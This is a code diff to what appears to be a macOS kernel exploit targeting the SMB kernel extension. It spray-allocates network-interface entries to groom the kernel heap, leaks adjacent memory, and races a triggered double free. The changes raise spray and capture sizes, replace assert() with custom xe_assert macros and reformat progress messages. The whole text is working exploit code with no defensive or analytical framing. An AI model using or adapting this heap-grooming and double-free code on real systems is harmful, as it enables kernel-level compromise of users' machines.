@@ -5,7 +5,6 @@
 //  Created by admin on 12/20/21.
 //
 
-#include <assert.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -23,9 +22,10 @@
 #include "util_misc.h"
 #include "util_dispatch.h"
 #include "util_log.h"
+#include "util_assert.h"
 
 
-#define NUM_SLOW_DOWN_NICS 100
+#define NUM_SLOW_DOWN_NICS 150
 #define NUM_SOCKETS_PER_SLOW_DOWN_NIC 10000
 
 
@@ -67,7 +67,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
         }
         
         int error = smb_nic_allocator_allocate(allocator, elements, num_elements_before_gap, (uint32_t)sizeof(elements));
-        assert(error == 0);
+        xe_assert_err(error);
         
         struct network_nic_info gap;
         bzero(&gap, sizeof(gap));
@@ -78,11 +78,11 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
         gap.addr_4.sin_addr.s_addr = gap_idx;
         
         error = smb_nic_allocator_allocate(gap_allocator, &gap, 1, sizeof(gap));
-        assert(error == 0);
+        xe_assert_err(error);
     }
     
     int error = smb_nic_allocator_destroy(&gap_allocator);
-    assert(error == 0);
+    xe_assert_err(error);
     
     char data[96];
     error = kmem_zkext_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
@@ -118,7 +118,7 @@ void kmem_zkext_free_kext_allocate_sockets(smb_nic_allocator allocator, int nic_
             info->nic_link_speed = UINT32_MAX;
         }
         int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
-        assert(error == 0);
+        xe_assert_err(error);
         done += batch_size;
     }
 }
@@ -139,7 +139,7 @@ void kmem_zkext_free_kext_reserve_nics(smb_nic_allocator allocator, size_t count
             info->next_offset = sizeof(*info);
         }
         int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
-        assert(error == 0);
+        xe_assert_err(error);
         done += batch_size;
     }
 }
@@ -157,7 +157,7 @@ kmem_zkext_free_session_t kmem_zkext_free_session_create(const struct sockaddr_i
 
 
 struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_session_t session) {
-    assert(session->state == STATE_CREATED);
+    xe_assert(session->state == STATE_CREATED);
     
     smb_nic_allocator nic_allocator;
     struct complete_nic_info_entry entry;
@@ -174,8 +174,8 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
         }
     } while (tries--);
     
-    assert(tries >= 0);
-    assert(entry.next.prev != 0);
+    xe_assert(tries >= 0);
+    xe_assert(entry.next.prev != 0);
     
     session->nic_allocator = nic_allocator;
     session->state = STATE_PREPARED;
@@ -184,19 +184,19 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
 
 
 void kmem_zkext_free_session_execute(kmem_zkext_free_session_t session, const struct complete_nic_info_entry* entry) {
-    assert(session->state == STATE_PREPARED);
+    xe_assert(session->state == STATE_PREPARED);
     
-    printf("[INFO] preparing for free ");
+    printf("[INFO] preparing for free\n");
     for (int i = 0; i < NUM_SLOW_DOWN_NICS; i++) {
         if ((i % ((NUM_SLOW_DOWN_NICS + 9) / 10)) == 0) {
-            printf(" %d/%d ", i,  NUM_SLOW_DOWN_NICS);
+            printf("[PROGRESS] %.2f%%\n", ((double)i / NUM_SLOW_DOWN_NICS) * 100.0);
         }
         kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, INT32_MAX - i, NUM_SOCKETS_PER_SLOW_DOWN_NIC, sizeof(struct sockaddr_in));
     }
-    printf("done\n");
+    printf("[INFO] done\n");
 
     kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
-    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 320);
+    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 512);
 
     dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
@@ -204,7 +204,7 @@ void kmem_zkext_free_session_execute(kmem_zkext_free_session_t session, const st
         bzero(&info, sizeof(info));
         info.nic_index = (uint32_t)entry->nic_index;
         int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
-        assert(error == ENOMEM);
+        xe_assert(error == ENOMEM);
         dispatch_semaphore_signal(sem_dbf_trigger);
     });
     
